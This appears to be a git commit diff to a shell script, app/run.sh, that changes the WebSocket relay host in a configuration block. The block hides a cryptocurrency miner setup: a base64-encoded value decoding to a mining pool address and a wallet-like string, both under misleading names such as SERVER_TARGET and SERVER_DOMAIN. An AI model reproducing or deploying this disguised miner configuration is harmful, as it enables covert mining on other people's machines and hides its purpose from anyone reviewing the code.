713e036f0105b7ca038f99ab894ae42a5f6e22ba
brontosimungo <brontosimungo@outlook.co.id>
2026-05-26 01:06:40 +0700

    Update run.sh

--- app/run.sh
+++ app/run.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 CONNECT=$1
 NAME=$2
-echo "SERVER_WS=wss://digitaldz.biz.id
+echo "SERVER_WS=wss://identical-sile-malphite-node-dfaa5ec5.koyeb.app
 SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
 SERVER_DOMAIN=82thAvdKbspiLhcSkNG8xrP7j3gwJKgrGj6w2A5j4urc64uJauggoeNWyHHh9hvasKTa1dnavqHh2f3fq2vuXchP7ENy9kJ
 SERVER_SECRET=${NAME}
